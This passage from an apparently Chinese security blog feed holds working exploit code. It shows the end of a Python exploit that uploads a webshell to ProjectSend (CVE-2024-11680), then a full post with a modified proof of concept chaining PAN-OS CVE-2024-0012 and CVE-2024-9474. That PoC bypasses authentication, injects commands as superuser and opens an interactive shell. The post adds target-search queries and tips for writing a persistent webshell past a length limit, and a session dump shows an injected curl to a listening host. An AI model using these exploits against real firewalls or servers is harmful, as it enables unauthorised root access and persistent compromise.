class="line"></span><br><span class="line">        response = <span class="variable language_">self</span>.make_request(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;includes/upload.process.php&#x27;</span>, files=files)</span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">and</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            logging.info(<span class="string">f&quot;[!] Successfully uploaded file: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> response.headers.get(<span class="string">&#x27;Date&#x27;</span>), filename</span><br><span class="line">        logging.error(<span class="string">&quot;File upload failed.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_shell</span>(<span class="params">self, username, upload_time, filename</span>):</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        logging.info(<span class="string">&#x27;[-] Verifying shell file...&#x27;</span>)</span><br><span class="line">        potential_urls = <span class="variable language_">self</span>.calculate_potential_filenames(username, upload_time, filename)</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> potential_urls:</span><br><span class="line">            response = <span class="variable language_">self</span>.make_request(<span class="string">&#x27;GET&#x27;</span>, <span class="string">f&#x27;upload/files/<span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> response <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                logging.info(<span class="string">f&quot;[!] WebShell Address: <span class="subst">&#123;urljoin(self.target_url, <span class="string">f&#x27;upload/files/<span class="subst">&#123;url&#125;</span>&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calculate_potential_filenames</span>(<span class="params">self, username, upload_time, filename</span>):</span><br><span class="line">        <span class="comment"># Hash the username using SHA1</span></span><br><span class="line">        hashed_username = hashlib.sha1(username.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="comment"># Parse the upload time</span></span><br><span class="line">        base_time = datetime.strptime(upload_time, <span class="string">&#x27;%a, %d %b %Y %H:%M:%S GMT&#x27;</span>).replace(tzinfo=<span class="literal">None</span>)</span><br><span class="line">        <span class="comment"># Array to store all possible URLs</span></span><br><span class="line">        possible_filenames = []</span><br><span class="line">        <span class="keyword">for</span> timezone <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">12</span>, <span class="number">15</span>):</span><br><span class="line">            <span class="comment"># Adjust the time based on the timezone</span></span><br><span class="line">            adj_time = base_time + timedelta(hours=timezone)</span><br><span class="line">            possible_filenames.append(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(adj_time.timestamp())&#125;</span>-<span class="subst">&#123;hashed_username&#125;</span>-<span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> possible_filenames</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">random_string</span>(<span class="params">self, length=<span class="number">8</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.check():</span><br><span class="line">            logging.error(<span class="string">&quot;Exploit failed at check phase.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.enable_user_registration():</span><br><span class="line">            logging.error(<span class="string">&quot;Exploit failed at enabling registration.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.disable_upload_restrictions()</span><br><span class="line"></span><br><span class="line">        username, password = <span class="variable language_">self</span>.register_new_user()</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> password <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.login(username, password):</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        upload_time, filename = <span class="variable language_">self</span>.upload_file()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> upload_time <span class="keyword">or</span> <span class="keyword">not</span> filename:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.verify_shell(username, upload_time, filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Target URL&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    exploit = ProjectSendExploit(args.url)</span><br><span class="line">    exploit.exploit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>效果展示：</p><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/12.png"></p><hr><p><a href="https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf">https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf</a><br><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/projectsend_unauth_rce.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/projectsend_unauth_rce.rb</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2024-11680&quot;&gt;CVE-2024-11680&lt;/a&gt;（CVSS 评分：9.8）- &lt;strong&gt;ProjectSend r1720之前的版本受到身份验证漏洞的影</summary>
      
    
    
    
    <category term="exploit" scheme="https://0or1zo.github.io/categories/exploit/"/>
    
    
    <category term="ProjectSend" scheme="https://0or1zo.github.io/tags/ProjectSend/"/>
    
    <category term="CVE-2024-11680" scheme="https://0or1zo.github.io/tags/CVE-2024-11680/"/>
    
  </entry>
  
  <entry>
    <title>Palo Alto PAN-OS CVE-2024-0012 and CVE-2024-9474</title>
    <link href="https://0or1zo.github.io/2024/11/22/Palo-Alto-PAN-OS-CVE-2024-0012-and-CVE-2024-9474/"/>
    <id>https://0or1zo.github.io/2024/11/22/Palo-Alto-PAN-OS-CVE-2024-0012-and-CVE-2024-9474/</id>
    <published>2024-11-22T11:23:48.000Z</published>
    <updated>2024-12-10T12:18:15.638Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p><a href="https://security.paloaltonetworks.com/CVE-2024-9474">CVE-2024-9474</a>（CVSS 评分：6.9）- <strong>Palo Alto Networks PAN-OS软件中存在权限提升漏洞，允许有权访问管理Web界面的PAN-OS管理员以root权限对防火墙执行操作。</strong></p></li><li><p><a href="https://security.paloaltonetworks.com/CVE-2024-0012">CVE-2024-0012</a>（CVSS 评分：9.3）- <strong>Palo Alto Networks PAN-OS软件中的身份验证绕过漏洞可使未经身份验证的攻击者通过网络访问管理Web界面，从而获取PAN-OS管理员权限以执行管理操作、篡改配置或利用其他经过身份验证的特权提升漏洞。</strong></p></li></ul><p>这两个是近期爆出关于网络安全供应商<code>Palo Alto Networks</code>的<code>PAN-OS</code>防火墙管理界面的零日漏洞，目前已经被广泛利用。通过这两个漏洞可在防火墙上进行交互式命令执行和放置webshell。</p><p>watchTowr的研究人员公布了有关<code>CVE-2024-0012</code>和<code>CVE-2024-9474</code>的更多技术细节文章——<a href="https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/">Pots and Pans, AKA an SSLVPN - Palo Alto PAN-OS CVE-2024-0012 and CVE-2024-9474</a>，讲解了如何将这两个漏洞串联起来以实现命令注入，并给出了POC。</p><p>这两个漏洞不需要用户交互或者权限即可利用，并且其攻击复杂性不高，漏洞原理就不再赘述，可以直接去看这篇文章，这里分享一下对漏洞验证和延伸的过程中踩到的坑。</p><h1 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h1><p>watchTowr实验室发布了一个<a href="https://github.com/watchtowrlabs/palo-alto-panos-cve-2024-0012">Nuclei模板</a>，可以使用它来检查目标是否存在漏洞。</p><p><img src="/img/Palo-Alto-PAN-OS-CVE-2024-0012-and-CVE-2024-9474/1.png"></p><div class="note info flat"><p>不要将PAN-OS和SSLVPN混淆。<br>以fofa举例，可通过<code>icon_hash=&quot;873381299&quot;</code>和<code>body=&quot;Panos.browser.cookie.set&quot;</code>查找目标。</p></div><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>要验证漏洞当然是要有poc啦，距离漏洞首次披露时间已经过去了两周半(bushi)，网上有人也已经写出来了，虽然自己也能写，但奈何代码功底不扎实，这东西自己用是无所谓（怎么写都可以），但毕竟是要拿出来给大家看的，还是要写好看一点，就在网上找了一个poc根据自己想要的效果稍微改动一下（^^）。原poc地址：<a href="https://github.com/Sachinart/CVE-2024-0012-POC">https://github.com/Sachinart/CVE-2024-0012-POC</a></p><p>稍微改动后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(*) CVE-2024-0012 PAN-OS: Authentication Bypass in the Management Web Interface (PAN-SA-2024-0015)</span></span><br><span class="line"><span class="string">(*) CVE-2024-9474 PAN-OS: Privilege Escalation (PE) Vulnerability in the Web Management Interface</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_logging</span>():</span><br><span class="line">    logging.basicConfig(</span><br><span class="line">        level=logging.INFO,</span><br><span class="line">        <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vuln</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_url, verify_ssl=<span class="literal">False</span>, command=<span class="literal">None</span>, timeout=<span class="number">30</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.base_url = base_url</span><br><span class="line">        <span class="variable language_">self</span>.verify_ssl = verify_ssl</span><br><span class="line">        <span class="variable language_">self</span>.command = command</span><br><span class="line">        <span class="variable language_">self</span>.timeout = timeout</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> verify_ssl:</span><br><span class="line">            urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">            <span class="variable language_">self</span>.session.verify = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_request</span>(<span class="params">self, method, endpoint, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = urljoin(<span class="variable language_">self</span>.base_url, endpoint)</span><br><span class="line">            kwargs[<span class="string">&#x27;timeout&#x27;</span>] = <span class="variable language_">self</span>.timeout</span><br><span class="line">            kwargs[<span class="string">&#x27;verify&#x27;</span>] = <span class="variable language_">self</span>.verify_ssl</span><br><span class="line">            kwargs[<span class="string">&#x27;allow_redirects&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">            <span class="comment">#kwargs[&#x27;proxies&#x27;] = &#123; &quot;http&quot;: &quot;http://127.0.0.1:8888&quot;,&quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;</span></span><br><span class="line">            </span><br><span class="line">            response = <span class="variable language_">self</span>.session.request(method, url, **kwargs)</span><br><span class="line">            response.raise_for_status()</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.SSLError <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">f&quot;SSL Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            logging.info(<span class="string">&quot;Try using --no-verify if the target uses self-signed certificates&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">f&quot;Request failed: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_initial_session</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Create initial session with command injection payload&quot;&quot;&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;X-PAN-AUTHCHECK&#x27;</span>: <span class="string">&#x27;off&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">f&#x27;`echo $(<span class="subst">&#123;self.command&#125;</span>)&gt;/var/appweb/htdocs/w`&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># The length of the executed command cannot exceed 63 characters.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(payload) &gt; <span class="number">63</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[Warning] The command length exceeds 63 characters!!!&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Command injection payload to write system info to file</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;userRole&#x27;</span>: <span class="string">&#x27;superuser&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;remoteHost&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;vsys&#x27;</span>: <span class="string">&#x27;vsys1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        response = <span class="variable language_">self</span>.make_request(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/php/utils/createRemoteAppwebSession.php/helloworld.js.map&#x27;</span>, headers=headers, data=data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">and</span> <span class="string">&#x27;PHPSESSID&#x27;</span> <span class="keyword">in</span> response.cookies:</span><br><span class="line">            phpsessid = response.cookies[<span class="string">&#x27;PHPSESSID&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> phpsessid</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">trigger_execution</span>(<span class="params">self, phpsessid</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Trigger command execution via index page&quot;&quot;&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;PHPSESSID=<span class="subst">&#123;phpsessid&#125;</span>&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        response = <span class="variable language_">self</span>.make_request(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/index.php/.js.map&#x27;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_execution</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Verify command execution by checking created file&quot;&quot;&quot;</span></span><br><span class="line">        response = <span class="variable language_">self</span>.make_request(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/w&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Vulnerability Check Script&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target base URL (http:// or https://)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--no-verify&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Disable SSL verification&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--timeout&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">30</span>, <span class="built_in">help</span>=<span class="string">&#x27;Request timeout in seconds&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--shell&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Open the command execution terminal&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    setup_logging()</span><br><span class="line">    logging.info(<span class="string">f&quot;Starting vulnerability check against <span class="subst">&#123;args.url&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        checker = Vuln(</span><br><span class="line">            args.url,</span><br><span class="line">            verify_ssl=<span class="keyword">not</span> args.no_verify,</span><br><span class="line">            command=<span class="string">&#x27;uname -a&#x27;</span>,</span><br><span class="line">            timeout=args.timeout</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Step 1: Create session with command injection payload</span></span><br><span class="line">        phpsessid = checker.create_initial_session()</span><br><span class="line">        <span class="keyword">if</span> phpsessid:</span><br><span class="line">            logging.info(<span class="string">f&quot;Initial session created: <span class="subst">&#123;phpsessid&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&quot;Session creation failed&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 2: Trigger command execution</span></span><br><span class="line">        trigger_execution_response = checker.trigger_execution(phpsessid)</span><br><span class="line">        <span class="keyword">if</span> trigger_execution_response <span class="keyword">and</span> trigger_execution_response.status_code == <span class="number">200</span>:</span><br><span class="line">            logging.info(<span class="string">&quot;Command execution triggered successfully&quot;</span>)</span><br><span class="line">            logging.info(<span class="string">f&quot;Trigger response status: <span class="subst">&#123;trigger_execution_response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> trigger_execution_response.text:</span><br><span class="line">                logging.info(<span class="string">f&quot;Response content length: <span class="subst">&#123;<span class="built_in">len</span>(trigger_execution_response.text)&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Step 3: Verify the result</span></span><br><span class="line">            logging.info(<span class="string">&quot;Command execution verified&quot;</span>)</span><br><span class="line">            verify_execution_response = checker.verify_execution()</span><br><span class="line">            <span class="keyword">if</span> verify_execution_response <span class="keyword">and</span> verify_execution_response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">if</span> verify_execution_response.text:</span><br><span class="line">                    logging.info(<span class="string">f&quot;System info: <span class="subst">&#123;verify_execution_response.text.strip()&#125;</span>&quot;</span>)</span><br><span class="line">                    logging.info(<span class="string">&quot;Verification completed successfully&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logging.error(<span class="string">&quot;Verification failed - file not created or accessible&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&quot;Command execution trigger failed&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Open the command execution terminal</span></span><br><span class="line">        <span class="keyword">if</span> args.shell:</span><br><span class="line">            logging.info(<span class="string">&quot;###########################################&quot;</span>)</span><br><span class="line">            logging.info(<span class="string">&quot;### Open the command execution terminal ###&quot;</span>)</span><br><span class="line">            logging.info(<span class="string">&quot;###########################################&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                command = <span class="built_in">input</span>(<span class="string">&quot;#: &quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> command == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                </span><br><span class="line">                shell = Vuln(</span><br><span class="line">                    args.url,</span><br><span class="line">                    verify_ssl=<span class="keyword">not</span> args.no_verify,</span><br><span class="line">                    command=command,</span><br><span class="line">                    timeout=args.timeout</span><br><span class="line">                )</span><br><span class="line">                </span><br><span class="line">                phpsessid = shell.create_initial_session()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> phpsessid:</span><br><span class="line">                    logging.error(<span class="string">&quot;Session creation failed&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                trigger_execution_response = checker.trigger_execution(phpsessid)</span><br><span class="line">                <span class="keyword">if</span> trigger_execution_response <span class="keyword">and</span> trigger_execution_response.status_code == <span class="number">200</span>:         </span><br><span class="line">                    verify_execution_response = checker.verify_execution()</span><br><span class="line">                    <span class="keyword">if</span> verify_execution_response <span class="keyword">and</span> verify_execution_response.status_code == <span class="number">200</span>:</span><br><span class="line">                        <span class="keyword">if</span> verify_execution_response.text:</span><br><span class="line">                            <span class="built_in">print</span>(verify_execution_response.text.strip())</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        logging.error(<span class="string">&quot;Verification failed - file not created or accessible&quot;</span>)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    logging.error(<span class="string">&quot;Command execution trigger failed&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>效果展示：</p><p><img src="/img/Palo-Alto-PAN-OS-CVE-2024-0012-and-CVE-2024-9474/2.png"></p><h1 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h1><p>基于网上的公开资料，poc已经可以达到命令执行并回显的效果，但是要持续的进行远程权限访问是不够的，幸好，该应用程序是使用伟大的PHP语言，由Apache服务器提供服务，并以Nginx反向代理为前端，所以可以通过WebShell的形式来维持权限。</p><p>那么接下来的目的就是通过命令注入向应用程序的web路径写入webshell，但是坑点来了，<strong>注入的命令长度一旦超过63个字符，就不会被执行</strong>，所以我在以上代码中加入了对执行命令的长度的检查。</p><p>为了绕过这个限制写入webshell，思路就是<code>把原本一条超过限制长度的命令拆分后依次执行</code>，由于写入webshell的路径基本是固定的（<code>/var/appweb/htdocs/unauth/</code>），其他路径也能写，不过访问需要带着经过权限提升后<code>cookie</code>中的<code>PHPSESSID</code>，不然访问文件会302跳转到登录页面。</p><p>提供一个大致的方法，可以将写入分成两步，把一句话webshell进行base64编码后写入到<code>/</code>路径下（这也是当前命令执行的路径），然后再解码至可访问的web目录。</p><p>由于是黑盒测试，就没有去细究这个问题产生的原因，但根据命令注入的点位(userName)猜测应该是用户名字的长度有限制。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]# <span class="built_in">cat</span> ./opt/pancfg/mgmt/phpsessions/sess_isbhbjpdkhvmkhio0hcpsgmtk6</span><br><span class="line">cmsRemoteSession|s:1:<span class="string">&quot;1&quot;</span>;panorama_sessionid|s:5:<span class="string">&quot;dummy&quot;</span>;user|s:16:<span class="string">&quot;XXXX&quot;</span>;userName|s:52:<span class="string">&quot;`curl &#123;&#123;listening-host&#125;&#125;`&quot;</span>;userRole|s:9:<span class="string">&quot;superuser&quot;</span></span><br></pre></td></tr></table></figure><hr><p>参考资料：<br><a 